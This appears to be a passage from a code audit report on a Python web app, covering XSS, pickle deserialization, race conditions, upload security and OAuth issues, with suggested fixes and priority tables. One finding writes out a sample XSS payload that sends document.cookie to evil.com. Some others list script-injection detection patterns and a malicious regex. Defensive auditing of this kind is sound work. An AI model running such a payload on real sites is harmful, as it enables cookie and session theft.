- **File**: `app/ssr_routes.py` lines 159-359, 566, 720, 831, 981
- **Issue**: SSR endpoints render user-controlled data (task titles, forum posts, leaderboard names, activity titles) into HTML **without escaping**. Direct f-string interpolation into `<h1>`, `<p>`, and `<meta>` tags.
- **Risk**: Attacker creates a task with title `"><script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. When shared on social media, the SSR page executes JS.
- **Fix**: Use `html.escape()` on ALL user-controlled data before HTML interpolation:
  ```python
  from html import escape

  # In generate_html() and all SSR endpoints:
  title = escape(title)
  meta_description = escape(clean_description)
  # For all f-string interpolations:
  f"<h1>{escape(task.title)}</h1>"
  f"<p>{escape(task.location or '未指定')}</p>"
  ```

### 12.2 Pickle Deserialization in Redis Cache (RCE)

- **File**: `app/redis_cache.py` lines 99-108
- **Issue**: `_deserialize()` uses `pickle.loads()` as PRIMARY deserialization. If Redis is compromised (credentials stolen, SSRF), attacker can execute arbitrary Python code.
- **Risk**: Remote Code Execution.
- **Fix**: Use JSON-first deserialization strategy. Remove pickle entirely or restrict to tagged entries only:
  ```python
  def _deserialize(self, data: bytes) -> Any:
      # JSON first (safe)
      try:
          return json.loads(data.decode('utf-8'))
      except Exception:
          pass
      # Log and reject unknown format
      logger.error("Cannot deserialize data: unknown format")
      return None
  ```

### 12.3 Translation Cache Poisoning

- **File**: `app/translation_manager.py` lines 604-619
- **Issue**: Translation responses from external services are cached without content validation. A compromised/MITM'd translation service can inject malicious HTML/JS into cached translations.
- **Fix**: Validate translations before caching:
  ```python
  dangerous_patterns = ['<script', 'javascript:', 'onerror=', 'onclick=', 'onload=']
  translated_lower = translated.lower()
  for pattern in dangerous_patterns:
      if pattern in translated_lower:
          logger.error(f"Suspicious translation blocked: {pattern}")
          return None  # Reject poisoned translation
  ```

### 12.4 Unbounded Redis Cache Growth (DoS)

- **File**: `app/cache_decorators.py` lines 138-142
- **Issue**: Cache entries have TTL but no max memory policy. Attacker requesting many unique cache keys fills Redis memory.
- **Fix**: Configure Redis `maxmemory-policy` at startup:
  ```python
  # In redis_pool.py or startup:
  redis_client.config_set('maxmemory-policy', 'allkeys-lru')
  ```

### 12.5 Cache Key Collision in Recommendations (MD5 Truncation)

- **File**: `app/recommendation_cache.py` lines 146-150
- **Issue**: Cache key uses MD5 hash truncated to 8 characters (2^32 space). Birthday paradox gives 50% collision at ~65K entries. Different users can receive each other's cached recommendations.
- **Fix**: Use full SHA256 hash or at minimum 16 hex characters:
  ```python
  filter_hash = hashlib.sha256(filter_part.encode()).hexdigest()[:16]
  ```

---

## 13. CRITICAL - Multi-Participant & Coupon/Points

### 13.1 Coupon Double-Spend Race Condition

- **File**: `app/coupon_points_routes.py` lines 847-923
- **Issue**: Coupon validation and usage are NOT atomic. Between `validate_coupon_usage()` and `use_coupon()`, another concurrent request can use the same coupon.
- **Fix**: Wrap both operations in a single transaction with `SELECT FOR UPDATE` on the UserCoupon row before validation.

### 13.2 Points Not Deducted on Coupon Claim Failure

- **File**: `app/coupon_points_routes.py` lines 163-230
- **Issue**: If `claim_coupon()` succeeds but `add_points_transaction()` fails, user gets the coupon without paying points.
- **Fix**: Use savepoint transaction:
  ```python
  savepoint = db.begin_nested()
  try:
      user_coupon, claim_error = claim_coupon(db, ...)
      if claim_error:
          savepoint.rollback()
          raise HTTPException(400, claim_error)
      add_points_transaction(db, ..., amount=-points_required, ...)
      savepoint.commit()
  except Exception:
      savepoint.rollback()
      raise
  ```

### 13.3 Multi-Participant Time Slot Overbooking

- **File**: `app/multi_participant_routes.py` lines 330-358
- **Issue**: Time slot `current_participants` counter incremented without proper atomicity between capacity check and increment. Concurrent joins can both pass the check.
- **Fix**: Use `SELECT FOR UPDATE` on the time slot and verify capacity AFTER acquiring lock:
  ```python
  slot = db.execute(
      select(ServiceTimeSlot).where(ServiceTimeSlot.id == slot_id).with_for_update()
  ).scalar_one()
  if slot.current_participants >= slot.max_participants:
      raise HTTPException(400, "Time slot full")
  slot.current_participants += 1
  ```

### 13.4 Unauthenticated Access to Task Participants List

- **File**: `app/multi_participant_routes.py` lines 119-171
- **Issue**: `/tasks/{task_id}/participants` uses `get_current_user_optional`. Unauthenticated users can enumerate all participants of any task (user IDs, names, avatars, statuses).
- **Fix**: Require authentication. Only allow poster, participants, and admins to view the list.

### 13.5 Points Reservation Not Rolled Back on Activity Creation Failure

- **File**: `app/multi_participant_routes.py` lines 1628-1674
- **Issue**: Points deducted before activity creation. If `db.commit()` for the activity fails, points are lost.
- **Fix**: Use nested transaction (savepoint) to wrap both operations atomically.

### 13.6 N+1 Query in Participant List

- **File**: `app/multi_participant_routes.py` lines 145-165
- **Issue**: For each participant, separate query to fetch User. 100 participants = 101 queries.
- **Fix**: Use `joinedload()`:
  ```python
  participants = db.query(TaskParticipant).options(
      joinedload(TaskParticipant.user)
  ).filter(...).all()
  ```

### 13.7 Missing Rate Limiting on Coupon Claims

- **File**: `app/coupon_points_routes.py` lines 279-346
- **Issue**: No `@rate_limit` decorator on coupon claim endpoint. Enables brute-force coupon code guessing.
- **Fix**: Add `@rate_limit("coupon_claim", limit=10, window=3600)`.

---

## 14. HIGH - File Upload & Image Security

### 14.1 IMAGE_ACCESS_SECRET Not Validated at Startup

- **File**: `app/image_system.py` line 44
- **Issue**: `IMAGE_ACCESS_SECRET` loaded from env but never validated. If missing, HMAC generation crashes or uses empty string, making all image tokens forgeable.
- **Fix**: Validate at startup in `main.py`:
  ```python
  if not os.getenv("IMAGE_ACCESS_SECRET"):
      raise RuntimeError("IMAGE_ACCESS_SECRET environment variable is required")
  ```

### 14.2 Missing File Size Validation on S3 Upload

- **File**: `app/services/storage_backend.py` lines 431-448
- **Issue**: `S3StorageBackend.upload()` accepts any size content. Can bypass application-level limits if called directly.
- **Fix**: Add size check:
  ```python
  MAX_FILE_SIZE = 20 * 1024 * 1024  # 20MB
  if len(content) > MAX_FILE_SIZE:
      raise ValueError(f"File too large: {len(content)} bytes")
  ```

### 14.3 Unrestricted Content-Type in S3 Upload

- **File**: `app/services/storage_backend.py` lines 437-438
- **Issue**: Content-Type guessed from extension without whitelist. Can upload executable content types.
- **Fix**: Whitelist allowed MIME types:
  ```python
  ALLOWED_TYPES = {'image/jpeg', 'image/png', 'image/webp', 'image/gif', 'application/pdf'}
  content_type = self._get_content_type(path)
  if content_type not in ALLOWED_TYPES:
      raise ValueError(f"Disallowed content type: {content_type}")
  ```

### 14.4 Image Processing DoS (Decompression Bomb)

- **File**: `app/services/image_processor.py` lines 86-98, 127-128
- **Issue**: `PIL.Image.open()` used without strict max pixel limit. Crafted images can decompress to GB+ in memory.
- **Fix**: Set strict limit before processing:
  ```python
  from PIL import Image
  Image.MAX_IMAGE_PIXELS = 25_000_000  # 25 megapixels max
  ```

### 14.5 EXIF/GPS Data Leakage

- **File**: `app/services/image_processor.py` lines 429-466
- **Issue**: `strip_metadata()` silently returns original content on failure. PNG/WebP metadata chunks not fully removed.
- **Fix**: Use `piexif.remove()` for JPEG, explicit chunk removal for PNG. Log and reject on strip failure instead of returning original.

### 14.6 S3 Objects Missing Explicit ACL

- **File**: `app/services/storage_backend.py` lines 364-412
- **Issue**: `put_object()` doesn't set ACL. If bucket misconfigured to `public-read`, all uploads become public.
- **Fix**: Add explicit private ACL:
  ```python
  self.client.put_object(
      Bucket=self.bucket_name,
      Key=path,
      Body=content,
      ContentType=content_type,
      ACL='private'  # Explicit
  )
  ```

### 14.7 Presigned URL Expiry Too Long (1 Hour)

- **File**: `app/services/storage_backend.py` line 648
- **Issue**: Presigned URLs for private content valid for 3600 seconds (1 hour).
- **Fix**: Reduce to 300 seconds (5 minutes) for private content.

### 14.8 No Rate Limiting on Upload Endpoints

- **File**: `app/upload_routes.py` lines 56-161
- **Issue**: Image upload endpoints have no rate limiting. Users can exhaust disk/S3 quota.
- **Fix**: Add `@rate_limit("upload", limit=30, window=3600)` (30 uploads/hour).

### 14.9 Image Token Verification Backward-Compatibility Bypass

- **File**: `app/image_system.py` lines 212-245
- **Issue**: Old token format accepted as fallback. Attacker can craft tokens using the weaker old logic.
- **Fix**: Remove old logic fallback. Force token refresh on deployment.

---

## 15. HIGH - Async/Sync Issues & Dependency Injection

### 15.1 Sync DB Sessions Inside Async Routes (Connection Leak)

- **File**: `app/async_routers.py` lines 752, 1009, 1416, 1451
- **Issue**: `sync_db = next(get_db())` creates synchronous sessions in async route handlers. Blocks event loop, risks connection pool exhaustion.
- **Fix**: Use `AsyncSession` exclusively in async routes, or offload sync operations:
  ```python
  # Instead of: sync_db = next(get_db())
  # Use: result = await asyncio.to_thread(sync_operation, ...)
  ```

### 15.2 Token Validation Bypass in Customer Service Dependencies

- **File**: `app/deps.py` lines 207-243
- **Issue**: `get_current_customer_service_or_user()` falls back to JWT validation if session fails. Accepts any valid JWT without verifying role matches database.
- **Fix**: After JWT decode, verify user role against database:
  ```python
  payload = verify_token(token, "access")
  if payload:
      db_user = crud.get_user_by_id(db, payload["sub"])
      if not db_user or db_user.role != payload.get("role"):
          raise HTTPException(401, "Invalid token role")
  ```

### 15.3 Missing Payment Verification Before Task Approval

- **File**: `app/async_routers.py` lines 966-989
- **Issue**: `approve_application` endpoint checks poster ownership but NOT whether the task is paid. Code comment says payment check "可能已废弃" (possibly deprecated).
- **Fix**: Enforce payment check before approval:
  ```python
  if not task.is_paid:
      raise HTTPException(400, "Task must be paid before approving applications")
  ```

### 15.4 Error Handler Information Leakage

- **File**: `app/error_handlers.py` line 370, `app/async_routers.py` lines 610, 648, 786
- **Issue**: Full stack traces logged and `traceback.print_exc()` called in async routes. Can expose internal paths and SQL queries.
- **Fix**: Log only error type and message. Remove `traceback.print_exc()` calls. Use structured logging with request ID.

### 15.5 Phone Number Normalization Inconsistency

- **File**: `app/validators.py` lines 117-131, `app/async_crud.py` lines 77-110
- **Issue**: `normalize_phone()` only handles +44 prefix. `get_user_by_phone()` tries multiple formats, potentially returning different users.
- **Fix**: Enforce canonical phone format at storage time. All lookups should use the same normalized format.

### 15.6 Weak Input Sanitization (Regex-Based HTML)

- **File**: `app/validators.py` lines 302-318
- **Issue**: `sanitize_html()` uses regex instead of proper HTML parser. Regex-based sanitization is historically bypassable.
- **Fix**: Use `bleach` library for HTML sanitization:
  ```python
  import bleach
  clean = bleach.clean(html_content, tags=['p', 'br', 'b', 'i'], strip=True)
  ```

---

## 16. HIGH - Student Verification & OAuth

### 16.1 No MX Record Verification for .ac.uk Domains

- **File**: `app/student_verification_validators.py` lines 37-39
- **Issue**: Email validation only checks `.ac.uk` suffix. Attacker can register `fake.ac.uk` domain and get verified as student.
- **Fix**: Validate against whitelist of known UK university domains, or verify MX records:
  ```python
  import dns.resolver
  try:
      records = dns.resolver.resolve(domain, 'MX')
      if not records:
          return False, "Invalid university email domain"
  except dns.resolver.NXDOMAIN:
      return False, "University domain does not exist"
  ```

### 16.2 OAuth Consent Form Missing CSRF Token

- **File**: `app/oauth/oauth_routes.py` lines 163-211
- **Issue**: OAuth consent form submitted via POST without CSRF token. Attacker can auto-submit consent form via CSRF to authorize their app using victim's session.
- **Fix**: Add hidden CSRF token to consent form, validate on POST:
  ```python
  csrf_token = secrets.token_urlsafe(32)
  redis_client.setex(f"oauth_csrf:{csrf_token}", 300, "1")
  # In form: <input type="hidden" name="csrf_token" value="{csrf_token}">
  # On POST: validate redis_client.getdel(f"oauth_csrf:{csrf_token}")
  ```

### 16.3 Undefined Constants in OAuth Userinfo (Runtime Error)

- **File**: `app/oauth/oauth_routes.py` lines 351, 362
- **Issue**: `SCOPE_PROFILE` and `SCOPE_EMAIL` referenced but NOT imported. Causes `NameError` crash on every userinfo request with profile/email scopes.
- **Fix**: Add missing imports:
  ```python
  from app.oauth.oauth_service import SCOPE_OPENID, SCOPE_PROFILE, SCOPE_EMAIL
  ```

### 16.4 University Matcher Regex Injection

- **File**: `app/university_matcher.py` lines 120-129
- **Issue**: `domain_pattern` from database used in regex without escaping special characters. Malicious pattern like `@(.*).ac.uk|^admin` matches any domain.
- **Fix**: Use exact string matching instead of regex:
  ```python
  # Instead of regex:
  if domain == uni.email_domain or domain.endswith('.' + uni.email_domain):
      return uni
  ```

### 16.5 Student Verification Token Race Condition

- **File**: `app/student_verification_routes.py` lines 478-687
- **Issue**: Token consumption (status change + token clear) is not atomic. Concurrent requests with same token can both succeed.
- **Fix**: Use Redis GETDEL for atomic token consumption:
  ```python
  email = redis_client.getdel(f"student_verification:token:{token}")
  if not email:
      raise HTTPException(400, "Token invalid or already used")
  ```

### 16.6 Missing Per-User Rate Limiting on Verification Endpoints

- **File**: `app/student_verification_routes.py` lines 323-475, 690-977
- **Issue**: Rate limits are per-IP only (5/minute). Distributed attacks can enumerate emails or brute-force tokens.
- **Fix**: Add per-user rate limit: 3 verification submissions per day per user.

### 16.7 Open Redirect via FRONTEND_URL

- **File**: `app/student_verification_routes.py` lines 554-556, `app/oauth/oauth_routes.py` lines 63-68
- **Issue**: Verification failures redirect to `Config.FRONTEND_URL`. If config is compromised, redirects to attacker domain.
- **Fix**: Hardcode allowed redirect domains or validate against whitelist.

---

## Implementation Priority Guide (Updated)

### Phase 1: Immediate (Security & Financial) - Do First
| Item | Section | Effort |
|------|---------|--------|
| Secret key leakage | 1.1 | 5 min |
| Path traversal fix | 1.3 | 15 min |
| Transfer race condition | 2.1 | 30 min |
| Transfer idempotency | 2.2 | 20 min |
| Refund precision fix | 2.3 | 45 min |
| Refund race condition | 2.4 | 30 min |
| Invitation code atomicity | 2.8 | 15 min |
| WebSocket import bug | 5.1 | 2 min |
| Celery duplicate code | 5.2 | 5 min |
| Hardcoded localhost URLs | 5.3 | 5 min |
| **SSR XSS fix** | **12.1** | **30 min** |
| **Pickle deserialization** | **12.2** | **20 min** |
| **OAuth CSRF token** | **16.2** | **20 min** |
| **OAuth missing imports** | **16.3** | **2 min** |
| **Admin authorization** | **11.1** | **45 min** |
| **Coupon double-spend** | **13.1** | **30 min** |
| **IAP verification enforcement** | 1.6 | 15 min |
| **IMAGE_ACCESS_SECRET check** | **14.1** | **5 min** |

### Phase 2: High Priority (Auth & Concurrency) - This Week
| Item | Section | Effort |
|------|---------|--------|
| Verification code brute force | 3.4 | 30 min |
| Task accept race condition | 4.1 | 30 min |
| Flea market double purchase | 4.2 | 30 min |
| Non-atomic webhooks | 2.6 | 1 hr |
| Webhook metadata validation | 2.7 | 30 min |
| CSRF token expiration | 3.7 | 30 min |
| Account enumeration | 3.8 | 10 min |
| **Multi-participant overbooking** | **13.3** | **30 min** |
| **Points/coupon atomicity** | **13.2** | **30 min** |
| **Translation cache poison** | **12.3** | **20 min** |
| **University domain validation** | **16.1** | **45 min** |
| **Sync DB in async routes** | **15.1** | **2 hrs** |
| **S3 content type whitelist** | **14.3** | **15 min** |
| **Token validation bypass** | **15.2** | **30 min** |
| **Batch reward approval** | **11.2** | **1 hr** |

### Phase 3: Performance - This Sprint
| Item | Section | Effort |
|------|---------|--------|
| N+1 in user statistics | 6.1 | 30 min |
| N+1 in task translations | 6.2 | 30 min |
| N+1 in flea market favorites | 6.3 | 30 min |
| N+1 in chat unread counts | 6.4 | 30 min |
| Unbounded scheduled task queries | 6.7 | 45 min |
| Pagination offset limits | 6.10 | 15 min |
| **N+1 in participant list** | **13.6** | **20 min** |
| **Cache key collision** | **12.5** | **15 min** |
| **Redis maxmemory policy** | **12.4** | **10 min** |
| **Image decompression bomb** | **14.4** | **10 min** |

### Phase 4: Cleanup & Hardening - Ongoing
| Item | Section | Effort |
|------|---------|--------|
| Bare exception handlers | 7.1 | 2 hrs |
| Missing schema validators | 7.8, 7.9 | 1 hr |
| Float/Decimal consistency | 8.1 | 1 hr |
| Database indexes | 8.2 | 30 min |
| Resource cleanup fixes | 9.1-9.7 | 2 hrs |
| Routers.py split | 10.1 | Multi-day |
| **Audit log IDOR** | **11.4** | **15 min** |
| **EXIF data leakage** | **14.5** | **30 min** |
| **Phone normalization** | **15.5** | **1 hr** |
| **HTML sanitization upgrade** | **15.6** | **30 min** |
| **Error handler info leakage** | **15.4** | **30 min** |
| **Upload rate limiting** | **14.8** | **15 min** |
| **Presigned URL expiry** | **14.7** | **5 min** |
| **Coupon rate limiting** | **13.7** | **10 min** |
| **Admin rate limiting** | **11.8** | **30 min** |
| **Regex injection fix** | **16.4** | **15 min** |
| **Participant list auth** | **13.4** | **15 min** |

---

## Quick Reference: Files to Modify (Updated)

### Phase 1: Immediate (Security & Financial) - Do First
| Item | Section | Effort |
|------|---------|--------|
| Secret key leakage | 1.1 | 5 min |
| Path traversal fix | 1.3 | 15 min |
| Transfer race condition | 2.1 | 30 min |
| Transfer idempotency | 2.2 | 20 min |
| Refund precision fix | 2.3 | 45 min |
| Refund race condition | 2.4 | 30 min |
| Invitation code atomicity | 2.8 | 15 min |
| WebSocket import bug | 5.1 | 2 min |
| Celery duplicate code | 5.2 | 5 min |
| Hardcoded localhost URLs | 5.3 | 5 min |

### Phase 2: High Priority (Auth & Concurrency) - This Week
| Item | Section | Effort |
|------|---------|--------|
| Verification code brute force | 3.4 | 30 min |
| Task accept race condition | 4.1 | 30 min |
| Flea market double purchase | 4.2 | 30 min |
| Non-atomic webhooks | 2.6 | 1 hr |
| Webhook metadata validation | 2.7 | 30 min |
| CSRF token expiration | 3.7 | 30 min |
| Account enumeration | 3.8 | 10 min |
| IAP verification enforcement | 1.6 | 15 min |

### Phase 3: Performance - This Sprint
| Item | Section | Effort |
|------|---------|--------|
| N+1 in user statistics | 6.1 | 30 min |
| N+1 in task translations | 6.2 | 30 min |
| N+1 in flea market favorites | 6.3 | 30 min |
| N+1 in chat unread counts | 6.4 | 30 min |
| Unbounded scheduled task queries | 6.7 | 45 min |
| Pagination offset limits | 6.10 | 15 min |

### Phase 4: Cleanup & Hardening - Ongoing
| Item | Section | Effort |
|------|---------|--------|
| Bare exception handlers | 7.1 | 2 hrs |
| Missing schema validators | 7.8, 7.9 | 1 hr |
| Float/Decimal consistency | 8.1 | 1 hr |
| Database indexes | 8.2 | 30 min |
| Resource cleanup fixes | 9.1-9.7 | 2 hrs |
| Routers.py split | 10.1 | Multi-day |

---

*(Old quick reference removed - see updated version above)*

---

## Statistics Summary

| Category | Count |
|----------|-------|
| **Total Issues** | **135+** |
| CRITICAL | 28 |
| HIGH | 42 |
| MEDIUM | 40 |
| LOW | 25+ |
| **Files Affected** | **38** |

### Issue Distribution by Domain
| Domain | Count |
|--------|-------|
| Security (XSS, injection, auth bypass) | 30 |
| Financial (payments, refunds, coupons) | 18 |
| Race Conditions | 12 |
| Performance (N+1, pagination) | 16 |
| Error Handling | 15 |
| Data Integrity | 10 |
| Resource Management | 12 |
| Admin Panel | 8 |
| File Upload/Image | 9 |
| Code Quality | 10+ |
